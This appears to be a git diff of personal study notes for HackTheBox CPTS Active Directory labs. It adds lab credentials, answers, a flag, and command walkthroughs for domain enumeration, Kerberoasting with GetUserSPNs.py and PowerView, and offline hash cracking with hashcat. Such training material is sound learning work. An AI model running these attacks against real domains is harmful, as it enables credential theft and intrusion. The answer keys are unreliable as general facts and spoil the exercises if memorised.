@@ -1,4 +1,13 @@
-
+---
+title: CPTS labs
+author: amandaguglieri
+draft: false
+TableOfContents: true
+tags:
+  - certification
+  - CPTS
+  - labs
+---
 ## [Getting Started](https://academy.hackthebox.com/module/details/77)
 
 ### Pentesting Basics
@@ -3418,7 +3427,7 @@ sudo crackmapexec smb 172.16.5.5 -u forend -p Klmcargo2 --groups | grep Interns
 Results: 10
 
 
-**Using Bloodhound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer)**
+RDP to 10.129.147.147 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". **Using Bloodhound, determine how many Kerberoastable accounts exist within the INLANEFREIGHT domain. (Submit the number as the answer)**
 
 [For installing and using bloodhound](bloodhound.md).
 
@@ -3428,6 +3437,173 @@ Results: 13
 
 
 **What PowerView function allows us to test if a user has administrative access to a local or remote host?**
+
+Results: Test-AdminAccess
+
+
+
+**Run Snaffler and hunt for a readable web config file. What is the name of the user in the connection string within the file?**
+
+Results: sa
+
+
+**What is the password for the database user?**
+
+Results: ILFREIGHTDB01!
+
+
+**RDP to 10.129.147.147 (ACADEMY-EA-MS01) with user "htb-student" and password "Academy_student_AD!". Enumerate the host's security configuration information and provide its AMProductVersion.**
+
+```
+# To RDP 
+xfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution
+
+# Get the current Defender status.
+Get-MpComputerStatus
+```
+
+Results: 4.18.2109.6  
+
+
+What domain user is explicitly listed as a member of the local Administrators group on the target host?
+
+```
+# To RDP 
+xfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution
+
+# Get members of Local Administrators group
+net localgroup Administrators
+
+# In the results you will see:
+Members                                                                    -----------------------------------                                        Administrator
+INLANEFREIGHT\adunn
+INLANEFREIGHT\Domain Admins
+INLANEFREIGHT\Domain Users
+The command completed successfully.
+```
+
+Results: adunn
+
+
+**Utilizing techniques learned in this section, find the flag hidden in the description field of a disabled account with administrative privileges. Submit the flag as the answer.**
+
+```
+# To RDP 
+xfreerdp /v:$ip /u:$username /cert:ignore /dynamic-resolution
+
+##########
+# With Get-AD 
+##########
+# Lists disabled users with LDAP and returns their samAccountName
+Get-ADUser -LDAPFilter '(userAccountControl:1.2.840.113556.1.4.803:=2)' | select samaccountname
+
+# Gets details about one of the users obtained
+Get-ADUser -Identity bross -Properties * 
+# Flag will be in the description field
+
+#########
+# With dsquery
+#########
+# Lists disabled users with LDAP and returns their samAccountName
+dsquery * -filter "(&(objectCategory=person)(objectClass=user)(userAccountControl:1.2.840.113556.1.4.803:=2))" -attr SamAccountName    
+
+# Gets details about one of the users obtained
+net user bross /domain 
+```
+
+Results: HTB{LD@P_I$_W1ld}
+
+
+### Cooking with Fire
+
+**SSH to $ip (ACADEMY-EA-ATTACK01) with user "htb-student" and password "HTB_@cademy_stdnt!". Retrieve the TGS ticket for the SAPService account. Crack the ticket offline and submit the password as your answer.**
+
+```
+# Connect via ssh
+ssh htb-student@$ip
+
+# Enumerate the network
+for i in {1..254} ;do (ping -c 1 172.16.5.$i | grep "bytes from" &) ;done
+
+# Enumerate SPNs in the Domain and we will see SAPService among them
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+# When prompted for the password, enter Klmcargo2
+
+# Generate TGD ticket for the SAPService account
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend -request-user SAPService -outputfile ker
+
+# Copy the ker file content to our kali attacker machine and crack it
+hashcat -m 13100 ker /usr/share/wordlists/rockyou.txt
+
+```
+
+Results: !SapperFi2
+
+
+**What powerful local group on the Domain Controller is the SAPService user a member of?**
+
+```
+GetUserSPNs.py -dc-ip 172.16.5.5 INLANEFREIGHT.LOCAL/forend
+# When prompted for the password, enter Klmcargo2. You will also obtain the groups that the user belongs to.
+```
+
+Results: Account Operators
+
+
+
+**What is the name of the service account with the SPN 'vmware/inlanefreight.local'?**
+
+```
+# Connect via rdp
+xfreerdp /v:$ip /u:$user /cert:ignore
+
+# List SPNs
+setspn.exe -Q */*
+# And pay attention to the firsts in the list:
+# CN=svc_vmwaresso,CN=Users,DC=INLANEFREIGHT,DC=LOCAL
+# vmware/inlanefreight.local  
+```
+
+Results: svc_vmwaresso
+
+
+**Crack the password for this account and submit it as your answer.**
+
+```
+# Connect via rdp
+xfreerdp /v:$ip /u:$user /cert:ignore
+
+# Go to tools
+cd C:\Tools
+
+# Import PowerView
+Import-module .\PowerView.ps1
+
+# List SPNs and returns their SamAccountName
+Get-DomainUser * -spn | select samaccountname 
+
+#  Generate a TGS ticker for a specific user:
+Get-DomainUser -Identity svc_vmwaresso | Get-DomainSPNTicket -Format Hashcat
+
+# After copying the ticket to the kali machine and removing blank spaces, crack it with hashcat
+hashcat -m 13100 rc4_to_crack /usr/share/wordlists/rockyou.txt 
+```
+
+Results: Virtual01
+
+### An ACE in the Hole
+
+
+Question
+
+```
+
+```
+
+Results:
+
+
+Question
 
 ```
 
@@ -3444,8 +3620,6 @@ Question
 ```
 
 Results:
-
-
 
 
 
